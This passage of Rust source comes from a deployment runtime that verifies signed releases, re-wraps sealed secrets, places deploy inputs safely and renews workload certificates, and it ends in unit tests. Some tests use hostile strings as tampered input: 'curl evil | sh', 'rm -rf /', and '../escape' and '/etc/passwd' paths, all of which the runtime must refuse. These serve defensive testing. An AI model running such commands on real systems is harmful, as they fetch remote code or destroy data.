            .map(|value| (&value.secret, &value.key));
        if step.sealed.is_empty()
            || !slots.eq(step
                .sealed
                .iter()
                .map(|sealed| (&sealed.secret, &sealed.key)))
        {
            bail!("the server's sealed values do not match the re-wrap step");
        }
        let dir = self.sealing_dir.as_deref().context(
            "the step re-wraps sealed values, and this runtime has no sealing key (enroll with --credential-file)",
        )?;
        let opener = SealedOpener::load(dir)?;
        step.sealed
            .iter()
            .zip(&release.sealed)
            .map(|(sealed, value)| {
                let slot = SecretRef::new(&sealed.secret, &sealed.key)?;
                let target = SealedTarget::new(environment, step.instance_name(), slot)?;
                if crate::sealed_secret::digest(&target, &value.sealed)? != sealed.digest {
                    bail!(
                        "sealed {}/{} does not match the re-wrap step's digest",
                        sealed.secret,
                        sealed.key
                    );
                }
                if value.sealed.wraps.len() >= crate::sealed_secret::MAX_WRAPS
                    && !value
                        .sealed
                        .wraps
                        .iter()
                        .any(|wrap| wrap.fingerprint == rewrap.fingerprint)
                {
                    bail!(
                        "sealed {}/{} already has {} recipients; revoke a runtime before adding one",
                        sealed.secret,
                        sealed.key,
                        crate::sealed_secret::MAX_WRAPS
                    );
                }
                // A runtime that lost its wrap opens through the recovered
                // one the approved step carries (ADR 0045 §7). Opening
                // authenticates it, so a wrap for another value fails here.
                let mut value = std::borrow::Cow::Borrowed(&value.sealed);
                let recovered = rewrap.recovered.iter().find(|wrap| {
                    wrap.secret == sealed.secret
                        && wrap.key == sealed.key
                        && wrap.digest == sealed.digest
                        && wrap.wrap.fingerprint == rewrap.fingerprint
                });
                if let Some(recovered) = recovered
                    && opener.fingerprint() == rewrap.fingerprint
                    && !value.wraps.iter().any(|wrap| wrap.fingerprint == rewrap.fingerprint)
                {
                    value.to_mut().wraps.push(recovered.wrap.clone());
                }
                Ok(crate::sealed_secret::RecipientWrap {
                    secret: sealed.secret.clone(),
                    key: sealed.key.clone(),
                    digest: sealed.digest.clone(),
                    wrap: opener.rewrap(&target, &value, &recipient)?,
                })
            })
            .collect()
    }

    /// Open the issuer key `issuer` carries with this runtime's sealing key
    /// and check it against the approved fingerprint; for a re-wrap, wrap
    /// it for the approved recipient, whose key must have the fingerprint
    /// the step names.
    pub fn run_issuer(
        &self,
        environment: &str,
        issuer: &IssuerStep,
        rewrap: Option<&RewrapStep>,
    ) -> Result<Vec<crate::sealed_secret::RecipientWrap>> {
        let dir = self.sealing_dir.as_deref().context(
            "the step opens the identity issuer key, and this runtime has no sealing key (enroll with --credential-file)",
        )?;
        let opener = SealedOpener::load(dir)?;
        let key = &issuer.key;
        key.open(environment, &opener)?;
        // A rotation step's key is one this runtime verified: every bundle
        // it issues beside the current issuer carries it (ADR 0046 §7).
        // Not optional: the step must not report success with the bundles
        // left behind.
        if issuer.phase.is_some() {
            crate::identity_issuer::cache_trusted(dir, environment, key)?;
        }
        let Some(rewrap) = rewrap else {
            return Ok(Vec::new());
        };
        let recipient = crate::sealing_key::SealingPublicKey::from_wire(
            issuer
                .recipient
                .as_deref()
                .context("the re-wrap step names no recipient key")?,
        )?;
        if recipient.fingerprint() != rewrap.fingerprint {
            bail!(
                "the step's recipient key is not the approved {}",
                rewrap.fingerprint
            );
        }
        if key.sealed_key.wraps.len() >= crate::sealed_secret::MAX_WRAPS
            && !key
                .sealed_key
                .wraps
                .iter()
                .any(|wrap| wrap.fingerprint == rewrap.fingerprint)
        {
            bail!(
                "the issuer key already has {} recipients; revoke a runtime before adding one",
                crate::sealed_secret::MAX_WRAPS
            );
        }
        let target = SealedTarget::identity_issuer(environment, key.generation)?;
        Ok(vec![crate::sealed_secret::RecipientWrap {
            secret: crate::identity_issuer::WRAP_SECRET.into(),
            key: key.wrap_key(),
            digest: key.digest(environment)?,
            wrap: opener.rewrap(&target, &key.sealed_key, &recipient)?,
        }])
    }

    /// Refuse a release this runtime must not run with a built-in executor,
    /// naming why. Only Helm and the host applier write sealed values
    /// (ADR 0048 §4). A host
    /// release runs only as a `host_step`, through this host's applier, and
    /// is never restored: anything else would run its commands outside the
    /// applier's approval and generation checks. `Ok` means
    /// [`SoftwareExecutors::resolve`] decides.
    pub fn admit_executor(&self, manifest: &Manifest, sealed: bool, host_step: bool) -> Result<()> {
        if manifest.product.kind.policy().target() != crate::product_kind::ProductTarget::Software {
            bail!("only software releases run on an environment runtime");
        }
        let kind = self.executors.effective_kind(manifest.deploy.executor);
        if (kind == Some(SoftwareExecutorKind::Host)) != host_step {
            bail!(if host_step {
                "the step is a host step, and the release is not a host release"
            } else {
                "a host release runs only as a host step through the host applier"
            });
        }
        match kind {
            Some(SoftwareExecutorKind::Host) => self.executors.host().map(|_| ()).context(
                "this runtime runs host releases only with a host applier (TENKAI_HOST_SPOOL_DIR)",
            ),
            Some(
                SoftwareExecutorKind::Helm
                | SoftwareExecutorKind::Kubernetes
                | SoftwareExecutorKind::KubernetesInProcess,
            ) if self.cluster_config.is_none() => bail!(
                "release declares deploy.executor = \"{}\", and this runtime has no cluster configuration (TENKAI_RUNTIME_CLUSTER_CONFIG)",
                kind.map_or("", SoftwareExecutorKind::as_str)
            ),
            Some(SoftwareExecutorKind::Helm) => Ok(()),
            _ if sealed => bail!(
                "the step writes sealed secrets or a workload certificate, and only the helm executor and the host applier write them; this release runs with {}",
                kind.map_or("shell", SoftwareExecutorKind::as_str)
            ),
            _ => Ok(()),
        }
    }

    /// Rebuild the deploy inputs under a staging directory, check them against
    /// the signed artifact digest, and move them to
    /// `<work_root>/<environment>/<product>/<artifact digest>`. A matching
    /// directory left by an earlier attempt is reused. Earlier releases stay:
    /// a running product may still read them, and a rollback reuses them.
    fn place(
        &self,
        environment: &str,
        product: &str,
        artifact_digest: &str,
        inputs: &[String],
        artifacts: &[crate::oci_artifact::OciArtifactRef],
        entries: &[crate::runtime_delivery::RuntimeReleaseEntry],
    ) -> Result<PathBuf> {
        crate::ontology::validate_identifier("environment", environment)?;
        crate::ontology::validate_identifier("product", product)?;
        if artifact_digest.is_empty()
            || !artifact_digest.bytes().all(|byte| byte.is_ascii_hexdigit())
        {
            bail!("the plan step's artifact digest is not a hex digest");
        }
        let product_dir = self.work_root.join(environment).join(product);
        std::fs::create_dir_all(&product_dir)
            .with_context(|| format!("creating {}", product_dir.display()))?;
        let destination = product_dir.join(artifact_digest);
        let matches = |dir: &Path| matches!(manifest::identity_digest(dir, inputs, artifacts), Ok(digest) if digest == artifact_digest);
        if !(destination.exists() && matches(&destination)) {
            let staging = product_dir.join(format!(".staging-{}", uuid::Uuid::new_v4().simple()));
            let written = write_entries(&staging, inputs, entries).and_then(|()| {
                let digest = manifest::identity_digest(&staging, inputs, artifacts)?;
                if digest != artifact_digest {
                    bail!(
                        "the release's deploy inputs do not match their signed digest: signed {artifact_digest}, received {digest}"
                    );
                }
                remove_tree(&destination)?;
                std::fs::rename(&staging, &destination)?;
                Ok(())
            });
            if let Err(error) = written {
                let _ = remove_tree(&staging);
                return Err(error);
            }
            crate::atomic_state::sync_dir(&product_dir)?;
        }
        // Staging left by a crashed attempt.
        for entry in std::fs::read_dir(&product_dir)? {
            let entry = entry?;
            if entry.file_name().to_string_lossy().starts_with(".staging-") {
                remove_tree(&entry.path())?;
            }
        }
        Ok(destination)
    }
}

/// Write `entries` under `root`. Every path must be relative, without `..`,
/// and inside one of `inputs`, so nothing outside the signed inputs lands in
/// the workdir. Modes are applied last, deepest first, so a read-only
/// directory does not block its own contents.
fn write_entries(
    root: &Path,
    inputs: &[String],
    entries: &[crate::runtime_delivery::RuntimeReleaseEntry],
) -> Result<()> {
    use std::io::Write as _;
    use std::os::unix::fs::{OpenOptionsExt as _, PermissionsExt as _};

    std::fs::create_dir(root).with_context(|| format!("creating {}", root.display()))?;
    let mut modes = Vec::with_capacity(entries.len());
    for entry in entries {
        let relative = Path::new(&entry.path);
        if relative.as_os_str().is_empty()
            || relative.is_absolute()
            || relative
                .components()
                .any(|part| !matches!(part, Component::Normal(_)))
        {
            bail!("release entry {:?} is not a relative path", entry.path);
        }
        if !inputs
            .iter()
            .any(|input| relative.starts_with(Path::new(input)))
        {
            bail!(
                "release entry {:?} is outside the signed deploy inputs",
                entry.path
            );
        }
        if entry.mode > 0o7777 {
            bail!("release entry {:?} has an invalid mode", entry.path);
        }
        let path = root.join(relative);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        match &entry.contents {
            None => std::fs::create_dir_all(&path)?,
            Some(contents) => {
                let bytes = base64::engine::general_purpose::STANDARD
                    .decode(contents)
                    .with_context(|| format!("release entry {:?} is not base64", entry.path))?;
                let mut file = std::fs::OpenOptions::new()
                    .write(true)
                    .create_new(true)
                    .mode(0o600)
                    .open(&path)
                    .with_context(|| format!("writing release entry {:?}", entry.path))?;
                file.write_all(&bytes)?;
                file.sync_all()?;
            }
        }
        modes.push((path, entry.mode));
    }
    for (path, mode) in modes.iter().rev() {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(*mode))?;
    }
    Ok(())
}

/// Remove `path` and everything under it, first making directories writable
/// so read-only release directories can go. Missing is fine.
fn remove_tree(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt as _;
    let metadata = match std::fs::symlink_metadata(path) {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(error) => return Err(error.into()),
    };
    if metadata.is_dir() {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))?;
        for entry in std::fs::read_dir(path)? {
            remove_tree(&entry?.path())?;
        }
        std::fs::remove_dir(path)?;
    } else {
        std::fs::remove_file(path)?;
    }
    Ok(())
}

/// One certificate renewal attempt: the instance and either the new
/// certificate's expiry (Unix seconds) or why it was not renewed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Renewal {
    pub instance: String,
    pub outcome: std::result::Result<i64, String>,
}

/// The validity of a certificate a target held when a pass read it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HeldCertificate {
    pub instance: String,
    pub not_before: i64,
    pub not_after: i64,
}

impl HeldCertificate {
    fn of(identity: &crate::workload_identity::InstalledIdentity) -> Self {
        Self {
            instance: identity.instance.clone(),
            not_before: identity.not_before,
            not_after: identity.not_after,
        }
    }
}

/// What one renewal pass did, and the certificates it found.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RenewalPass {
    pub renewals: Vec<Renewal>,
    /// Every certificate that proved its grant, as read before renewal.
    pub certificates: Vec<HeldCertificate>,
    /// Why a target could not be read; its certificates are left out.
    pub unreadable: Vec<String>,
}

/// Renew every workload certificate of `environment` that is due
/// (ADR 0046 §3). Needs no plan, approval or server: each adapter lists what
/// its target holds, and a due certificate is re-issued for exactly its
/// recorded grant from the issuer this runtime last verified. Idempotent:
/// a crash before the write leaves the old certificate due, and one after
/// leaves a fresh one that is not. An adapter that cannot be read is named
/// in [`RenewalPass::unreadable`]; other adapters still run.
pub fn renew_identities(
    config: &BuiltinConfig,
    environment: &str,
    now_secs: i64,
) -> Result<RenewalPass> {
    let Some(dir) = config.sealing_dir.as_deref() else {
        return Ok(RenewalPass::default());
    };
    let target = crate::software_executor::IdentityTarget {
        environment,
        cluster_config_path: config.cluster_config.as_deref(),
    };
    let mut renewals = Vec::new();
    let mut certificates = Vec::new();
    let mut unreadable = Vec::new();
    // A certificate whose bundle a rotation changed is renewed now, without
    // the restart spread: peers must trust the next issuer before it issues.
    let trust = expected_trust(dir, environment);
    for adapter in config.executors.adapters() {
        // Restarts a crashed pass left part-way finish first.
        match adapter.resume_identity_restarts(&target) {
            Ok(resumed) => renewals.extend(resumed.into_iter().filter_map(|(instance, done)| {
                let error = done.err()?;
                Some(Renewal {
                    instance,
                    outcome: Err(format!("{error:#}")),
                })
            })),
            Err(error) => unreadable.push(format!("{error:#}")),
        }
        let installed = match adapter.installed_identities(&target) {
            Ok(installed) => installed,
            Err(error) => {
                unreadable.push(format!("{error:#}"));
                continue;
            }
        };
        for (instance, identity) in installed {
            let identity = match identity {
                Ok(identity) => identity,
                Err(error) => {
                    renewals.push(Renewal {
                        instance,
                        outcome: Err(format!("{error:#}")),
                    });
                    continue;
                }
            };
            certificates.push(HeldCertificate::of(&identity));
            if !renewal_due(&identity, environment, now_secs)
                && !bundle_stale(&identity, trust.as_ref())
            {
                continue;
            }
            let outcome = renew_one(dir, environment, &identity, now_secs, true)
                .and_then(|issued| {
                    adapter.renew_identity(&target, &identity, &issued)?;
                    Ok(now_secs + crate::workload_identity::WORKLOAD_CERTIFICATE_TTL_SECS)
                })
                .map_err(|error| format!("{error:#}"));
            renewals.push(Renewal {
                instance: identity.instance,
                outcome,
            });
        }
    }
    if let Ok(host) = config.executors.host() {
        match host.installed_identities(environment) {
            Ok(installed) => {
                for (instance, identity) in installed {
                    if let Ok(identity) = &identity {
                        certificates.push(HeldCertificate::of(&identity.installed));
                    }
                    let outcome = match identity {
                        Err(error) => Err(error),
                        // The applier renews in place only; a host
                        // restart-reload workload is not renewed yet.
                        Ok(identity)
                            if identity.installed.grant.reload
                                != crate::workload_identity::Reload::Runtime
                                || !identity.installed.renewal_due(now_secs) =>
                        {
                            continue;
                        }
                        Ok(identity) => renew_host(host, dir, environment, &identity, now_secs),
                    };
                    renewals.push(Renewal {
                        instance,
                        outcome: outcome.map_err(|error| format!("{error:#}")),
                    });
                }
            }
            Err(error) => unreadable.push(format!("host: {error:#}")),
        }
    }
    Ok(RenewalPass {
        renewals,
        certificates,
        unreadable,
    })
}

/// One renewal pass of `environment` (ADR 0046 §3): renew what is due, log
/// and audit each attempt, and return the certificate state to report.
/// Failing to audit is logged; it never stops renewal.
pub fn renew_and_audit(
    config: &BuiltinConfig,
    environment: &str,
    now_secs: i64,
) -> Result<Vec<crate::certificate_reports::CertificateReport>> {
    use crate::certificate_reports::{
        CERTIFICATE_REPORT_SCHEMA, CertificateReport, RenewalEvent, RenewalOutcome,
    };
    let pass = renew_identities(config, environment, now_secs)?;
    for unreadable in &pass.unreadable {
        eprintln!("reading workload certificates of {environment} failed (retrying): {unreadable}");
    }
    let mut attempts = Vec::new();
    for renewal in pass.renewals {
        let outcome = match renewal.outcome {
            Ok(not_after) => {
                eprintln!(
                    "renewed the workload certificate of {}; it expires at {not_after}",
                    renewal.instance
                );
                RenewalOutcome::Renewed { not_after }
            }
            Err(reason) => {
                eprintln!(
                    "renewing the workload certificate of {} failed (retrying): {reason}",
                    renewal.instance
                );
                RenewalOutcome::Failed { reason }
            }
        };
        attempts.push(RenewalEvent {
            at: now_secs,
            instance: renewal.instance,
            outcome,
        });
    }
    let Some(dir) = config.sealing_dir.as_deref() else {
        return Ok(Vec::new());
    };
    if let Err(error) = crate::renewal_audit::record(dir, environment, attempts) {
        eprintln!("auditing workload certificate renewals failed: {error:#}");
    }
    let last = crate::renewal_audit::last(dir, environment).unwrap_or_else(|error| {
        eprintln!("reading the workload certificate renewal audit failed: {error:#}");
        Default::default()
    });
    Ok(pass
        .certificates
        .into_iter()
        .map(|held| CertificateReport {
            schema: CERTIFICATE_REPORT_SCHEMA.into(),
            environment: environment.into(),
            last_renewal: last.get(&held.instance).cloned(),
            instance: held.instance,
            not_before: held.not_before,
            not_after: held.not_after,
        })
        .collect())
}

/// Whether `identity` is due. A restart-reload workload falls due up to a
/// twelfth of its lifetime later, by an amount fixed per environment, so
/// replicas of one topology in different environments do not restart
/// together, and every restart still starts well before the last sixth.
fn renewal_due(
    identity: &crate::workload_identity::InstalledIdentity,
    environment: &str,
    now_secs: i64,
) -> bool {
    let delay = match identity.grant.reload {
        crate::workload_identity::Reload::Runtime => 0,
        crate::workload_identity::Reload::Restart => {
            restart_delay(environment, identity.not_after - identity.not_before)
        }
    };
    identity.renewal_due(now_secs.saturating_sub(delay))
}

/// `environment`'s fixed share of a twelfth of `lifetime`, in seconds.
fn restart_delay(environment: &str, lifetime: i64) -> i64 {
    use sha2::Digest as _;
    let spread = u64::try_from(lifetime / 12).unwrap_or(0).max(1);
    let digest = sha2::Sha256::digest(environment.as_bytes());
    let mut first = [0u8; 8];
    first.copy_from_slice(&digest[..8]);
    i64::try_from(u64::from_be_bytes(first) % spread).unwrap_or(0)
}

/// Renew a host certificate through the applier unit, waiting for it on
/// this blocking pool thread of the agent's runtime.
fn renew_host(
    host: &crate::host_executor::HostExecutor,
    dir: &Path,
    environment: &str,
    identity: &crate::host_executor::InstalledHostIdentity,
    now_secs: i64,
) -> Result<i64> {
    // The host applier installs the granted issuer alone.
    let issued = renew_one(dir, environment, &identity.installed, now_secs, false)?;
    tokio::runtime::Handle::try_current()
        .context("renewing a host certificate needs the agent's runtime")?
        .block_on(host.renew_identity(identity, &issued))?;
    Ok(now_secs + crate::workload_identity::WORKLOAD_CERTIFICATE_TTL_SECS)
}

/// Re-issue `identity`'s recorded grant from the cached issuer.
fn renew_one(
    dir: &Path,
    environment: &str,
    identity: &crate::workload_identity::InstalledIdentity,
    now_secs: i64,
    bundle: bool,
) -> Result<crate::workload_identity::IssuedIdentity> {
    let issuer = crate::identity_issuer::cached_verified(dir, environment)?.context(
        "this runtime has verified no identity issuer yet; it renews once it applies a step that grants a certificate",
    )?;
    let grant = &identity.grant;
    if grant.issuer_generation != issuer.generation {
        bail!(
            "the certificate was issued by issuer generation {}, and this runtime holds generation {}; it needs a new approved issuance",
            grant.issuer_generation,
            issuer.generation
        );
    }
    let key = issuer.open(environment, &SealedOpener::load(dir)?)?;
    if !bundle {
        return crate::workload_identity::issue(grant, &issuer, key, now_secs);
    }
    issue_with_bundle(dir, environment, grant, &issuer, key, now_secs)
}

/// Issue `grant` from `issuer` with the trust bundle of the issuers this
/// runtime verified for a rotation. An unreadable cache fails the issuance,
/// so a renewal never replaces a bundle with a smaller one.
fn issue_with_bundle(
    dir: &Path,
    environment: &str,
    grant: &crate::workload_identity::IdentityGrant,
    issuer: &crate::identity_issuer::IssuerKey,
    key: rcgen::KeyPair,
    now_secs: i64,
) -> Result<crate::workload_identity::IssuedIdentity> {
    let trusted = crate::identity_issuer::trust_bundle(dir, environment, issuer)
        .context("reading the trusted identity issuers")?;
    let certificates: Vec<&str> = trusted
        .iter()
        .map(|trusted| trusted.certificate.as_str())
        .collect();
    crate::workload_identity::issue_trusting(grant, issuer, key, &certificates, now_secs)
}

/// The trust bundle certificates of the issuing issuer should carry, as
/// fingerprints with the issuer first, and the issuer's generation. None
/// while this runtime has verified no issuer or cannot read its cache; a
/// due renewal then fails visibly instead.
fn expected_trust(dir: &Path, environment: &str) -> Option<(u64, Vec<String>)> {
    let issuer = crate::identity_issuer::cached_verified(dir, environment).ok()??;
    let trusted = crate::identity_issuer::trust_bundle(dir, environment, &issuer).ok()?;
    let fingerprints = std::iter::once(issuer.fingerprint)
        .chain(trusted.into_iter().map(|trusted| trusted.fingerprint))
        .collect();
    Some((issuer.generation, fingerprints))
}

/// Whether `identity`, issued by the issuing issuer, lacks an issuer its
/// trust bundle should carry: a rotation added one. A bundle that holds
/// more is left alone, so two runtimes that know different issuers never
/// take turns re-issuing it.
fn bundle_stale(
    identity: &crate::workload_identity::InstalledIdentity,
    expected: Option<&(u64, Vec<String>)>,
) -> bool {
    expected.is_some_and(|(generation, trust)| {
        identity.grant.issuer_generation == *generation
            && trust
                .iter()
                .any(|fingerprint| !identity.trust.contains(fingerprint))
    })
}

#[cfg(test)]
mod tests {
    use std::collections::{BTreeMap, BTreeSet};

    use super::*;
    use crate::host_apply::fixture::{HostFixture, key, sign_release_with};
    use crate::runtime_delivery::RuntimeReleaseEntry;

    const ENVIRONMENT: &str = "prod";

    /// A signed shell release of `api` 1.0.0 with one deploy input, the
    /// plan step that names it, and a runtime trusting the fixture's key.
    struct Case {
        config: BuiltinConfig,
        release: RuntimeRelease,
        step: Step,
        root: PathBuf,
    }

    impl Drop for Case {
        fn drop(&mut self) {
            let _ = remove_tree(&self.root);
        }
    }

    fn case(manifest_extra: &str) -> Case {
        let root = std::env::temp_dir().join(format!(
            "tenkai-builtin-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4().simple()
        ));
        let source = root.join("source");
        std::fs::create_dir_all(source.join("app")).unwrap();
        std::fs::write(source.join("app/run.sh"), b"echo hi\n").unwrap();
        let manifest = format!(
            "[product]\nname = \"api\"\nversion = \"1.0.0\"\n\n[deploy]\ninstall = \"true\"\ninputs = [\"app\"]\n{manifest_extra}"
        );
        let parsed = manifest::parse_raw(&manifest).unwrap();
        let artifact_digest =
            manifest::artifact_digest(&source, &parsed.immutable_inputs()).unwrap();
        let fixture = HostFixture::new(&[], Vec::new());
        let signature = fixture.sign_release(
            &manifest::digest(&manifest),
            &artifact_digest,
            crate::now_millis(),
        );
        let mode = |path: &str| {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::metadata(source.join(path))
                .unwrap()
                .permissions()
                .mode()
                & 0o7777
        };
        let entries = vec![
            RuntimeReleaseEntry {
                path: "app".into(),
                mode: mode("app"),
                contents: None,
            },
            RuntimeReleaseEntry {
                path: "app/run.sh".into(),
                mode: mode("app/run.sh"),
                contents: Some(base64::engine::general_purpose::STANDARD.encode(b"echo hi\n")),
            },
        ];
        let request = crate::software_executor::request_from_parts(
            "api",
            "1.0.0",
            ENVIRONMENT,
            Path::new(""),
            "tenkai:release:api@1.0.0",
        );
        let step = Step {
            id: "step-0".into(),
            order: 0,
            product: "api".into(),
            instance: String::new(),
            action: Action::Install,
            from: None,
            to: "1.0.0".into(),
            release_id: crate::ontology::release_id("api", "1.0.0"),
            release_digest: manifest::digest(&manifest),
            artifact_digest,
            workdir: String::new(),
            restore: None,
            host: None,
            sealed: Vec::new(),
            rewrap: None,
            issuer: None,
            identity: None,
            restore_identity: None,
        };
        Case {
            config: BuiltinConfig {
                executors: SoftwareExecutors::default(),
                release_roots: fixture.trust.release_roots.clone(),
                cluster_config: None,
                secret_dir: None,
                sealing_dir: None,
                work_root: root.join("work"),
            },
            release: RuntimeRelease {
                manifest,
                signature,
                request,
                entries,
                replaces: None,
                sealed: Vec::new(),
                rewrap_recipient: None,
                identity_issuer: None,
            },
            step,
            root,
        }
    }

    /// [`case`] for a release that asks for a server certificate, with an
    /// issuer sealed to this runtime and the grant the planner computes.
    fn identity_case() -> Case {
        identity_case_reloading("restart")
    }

    fn identity_case_reloading(reload: &str) -> Case {
        let mut case = case(&format!(
            "\n[deploy.identity]\ncertificate = \"server\"\nreload = \"{reload}\"\ndns_names = [\"api.prod.svc\"]\n",
        ));
        let sealing = case.root.join("sealing");
        std::fs::create_dir_all(&sealing).unwrap();
        let public = crate::sealing_key::SealingKey::open_or_generate(&sealing)
            .unwrap()
            .public()
            .clone();
        let issuer =
            crate::identity_issuer::generate(ENVIRONMENT, 1, &public, crate::now_millis() / 1000)
                .unwrap();
        let section = manifest::parse_raw(&case.release.manifest)
            .unwrap()
            .deploy
            .identity
            .unwrap();
        case.step.identity =
            Some(crate::workload_identity::grant(&section, ENVIRONMENT, "api", &issuer).unwrap());
        case.config.sealing_dir = Some(sealing);
        case.release.identity_issuer = Some(issuer);
        // A step with a grant always delivers a document, here with no peers.
        case.release.request.dependency_document = crate::dependency_document::json_with_peers(
            "",
            &crate::workload_identity::Peers::default(),
        )
        .unwrap();
        case
    }

    #[test]
    fn sans_that_differ_from_the_manifest_are_refused_by_the_runtime() {
        let mut case = identity_case();
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let issued = verified.request.identity.unwrap();
        crate::workload_identity::check_issued(&issued, crate::now_millis() / 1000).unwrap();

        // A plan step that grants a name the signed manifest does not ask for.
        let grant = case.step.identity.as_mut().unwrap();
        grant.dns_names.push("bank.example".into());
        let error = refusal(&case, case.release.clone());
        assert!(
            error.contains("is not what the signed manifest gives"),
            "{error}"
        );
    }

    #[test]
    fn a_dependency_document_with_a_peer_the_approved_bindings_lack_is_refused() {
        let mut case = identity_case();
        let caller = crate::workload_identity::uri(ENVIRONMENT, "app");
        case.step.identity.as_mut().unwrap().peers.clients =
            BTreeMap::from([("database".into(), BTreeSet::from([caller.clone()]))]);
        let document = |callers: &[&str]| {
            serde_json::json!({
                "version": 1,
                "contracts": {},
                "callers": { "database": callers },
            })
            .to_string()
        };
        let mut release = case.release.clone();
        release.request.dependency_document = document(&[&caller]);
        case.config
            .verify(release, ENVIRONMENT, &Expected::target(&case.step))
            .unwrap();

        // The server adds a caller no approved binding gives.
        let mut release = case.release.clone();
        let intruder = crate::workload_identity::uri(ENVIRONMENT, "intruder");
        release.request.dependency_document = document(&[&caller, &intruder]);
        let error = refusal(&case, release);
        assert!(
            error.contains("names peers the plan step does not grant"),
            "{error}"
        );
    }

    #[test]
    fn a_restore_issues_from_its_own_grant() {
        let mut case = identity_case();
        case.step.from = Some("1.0.0".into());
        case.step.restore = Some(crate::plan::ReleasePin {
            release_id: case.step.release_id.clone(),
            digest: case.step.release_digest.clone(),
            artifact_digest: case.step.artifact_digest.clone(),
            workdir: String::new(),
        });
        let restore = |step: &Step| {
            case.config.verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::restore(step).unwrap(),
            )
        };
        // Without a restore grant the target's is never used for it.
        let error = format!("{:#}", restore(&case.step).unwrap_err());
        assert!(error.contains("the plan step grants none"), "{error}");

        case.step.restore_identity = case.step.identity.take();
        let issued = restore(&case.step).unwrap().request.identity.unwrap();
        assert_eq!(Some(&issued.grant), case.step.restore_identity.as_ref());
    }

    #[test]
    fn a_host_health_step_keeps_the_certificate_its_install_wrote() {
        let mut case = identity_case();
        case.step.identity = None;
        case.step.host = Some(crate::plan::HostStep {
            action: crate::plan::HostAction::Health,
            expected_generation: 1,
        });
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        assert!(verified.request.identity.is_none());
    }

    #[test]
    fn removing_a_release_with_a_certificate_issues_none() {
        let mut case = identity_case();
        case.step.action = Action::Remove;
        case.step.identity = None;
        case.release.identity_issuer = None;
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        assert!(verified.request.identity.is_none());
    }

    fn refusal(case: &Case, release: RuntimeRelease) -> String {
        format!(
            "{:#}",
            case.config
                .verify(release, ENVIRONMENT, &Expected::target(&case.step))
                .unwrap_err()
        )
    }

    #[test]
    fn a_verified_release_lands_in_its_content_addressed_workdir() {
        let case = case("");
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let workdir = case
            .config
            .work_root
            .join(ENVIRONMENT)
            .join("api")
            .join(&case.step.artifact_digest);
        assert_eq!(verified.request.workdir, workdir);
        assert_eq!(
            std::fs::read(workdir.join("app/run.sh")).unwrap(),
            b"echo hi\n"
        );
        // Only a runtime removes Tenkai-owned Secrets with a release; a
        // server's request can never ask for it.
        assert!(verified.request.remove_owned_secrets);
        assert!(!case.release.request.remove_owned_secrets);
        // A retry after a crash reuses the placed release.
        let again = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        assert_eq!(again.request.workdir, workdir);
    }

    #[test]
    fn a_release_the_runtime_cannot_trust_is_refused_before_anything_is_written() {
        let case = case("");

        let mut tampered = case.release.clone();
        tampered.entries[1].contents =
            Some(base64::engine::general_purpose::STANDARD.encode(b"curl evil | sh\n"));
        assert!(refusal(&case, tampered).contains("do not match their signed digest"));

        let mut foreign = case.release.clone();
        foreign.signature = sign_release_with(
            &key(9),
            &case.step.release_digest,
            &case.step.artifact_digest,
            crate::now_millis(),
        );
        assert!(refusal(&case, foreign).contains("trust roots"));

        let mut swapped = case.release.clone();
        swapped.manifest = swapped
            .manifest
            .replace("install = \"true\"", "install = \"rm -rf /\"");
        assert!(refusal(&case, swapped).contains("release digest"));

        let mut retargeted = case.release.clone();
        retargeted.request.environment = "staging".into();
        assert!(refusal(&case, retargeted).contains("does not match the plan step"));

        for path in ["../escape", "/etc/passwd", "other/file"] {
            let mut escaping = case.release.clone();
            escaping.entries[1].path = path.into();
            let refused = refusal(&case, escaping);
            assert!(
                refused.contains("not a relative path") || refused.contains("outside the signed"),
                "{path}: {refused}"
            );
        }
        let placed = case.config.work_root.join(ENVIRONMENT).join("api");
        assert_eq!(std::fs::read_dir(placed).unwrap().count(), 0);
    }

    #[test]
    fn kubernetes_releases_need_a_local_cluster_config_and_host_releases_a_host_applier() {
        let mut case = case("executor = \"helm\"\n");
        let manifest = manifest::parse_raw(&case.release.manifest).unwrap();
        let refused = format!(
            "{:#}",
            case.config
                .admit_executor(&manifest, false, false)
                .unwrap_err()
        );
        assert!(
            refused.contains("TENKAI_RUNTIME_CLUSTER_CONFIG"),
            "{refused}"
        );
        case.config.cluster_config = Some(case.root.join("cluster.yaml"));
        case.config.admit_executor(&manifest, false, false).unwrap();

        let host = manifest::parse_raw(
            "[product]\nname = \"api\"\nversion = \"1.0.0\"\n\n[deploy]\nexecutor = \"host\"\ninstall = \"true\"\nuninstall = \"true\"\nhealth = \"true\"\ninputs = [\"app\"]\n",
        )
        .unwrap();
        let refused = format!(
            "{:#}",
            case.config.admit_executor(&host, false, true).unwrap_err()
        );
        assert!(refused.contains("TENKAI_HOST_SPOOL_DIR"), "{refused}");
        let executors = std::mem::take(&mut case.config.executors);
        case.config.executors =
            executors.with_host(Arc::new(crate::host_executor::HostExecutor::new(
                case.root.join("spool"),
                case.root.join("state"),
                Arc::new(crate::host_executor::Systemctl),
            )));
        case.config.admit_executor(&host, false, true).unwrap();
        // The host applier writes sealed values to their target files.
        case.config.admit_executor(&host, true, true).unwrap();
        // A host release never runs outside a host step, as a plain step or
        // a restore, and a host step runs nothing but a host release.
        let refused = format!(
            "{:#}",
